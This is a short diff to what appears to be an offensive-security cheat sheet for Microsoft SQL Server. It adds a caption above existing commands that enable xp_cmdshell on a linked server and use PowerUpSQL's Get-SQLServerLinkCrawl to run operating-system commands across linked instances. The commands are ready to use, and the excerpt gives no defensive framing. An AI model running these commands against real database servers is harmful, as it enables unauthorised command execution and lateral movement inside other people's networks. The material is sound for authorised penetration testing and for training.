@@ -917,6 +917,7 @@ Now -
 
 
 #### Code Execution
+Turn xp_cmdshell on:
 ```EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"```
 
 ```Get-SQLServerLinkCrawl -Instance ecorp-mssql  -Query "exec master..xp_cmdshell 'whoami'"```
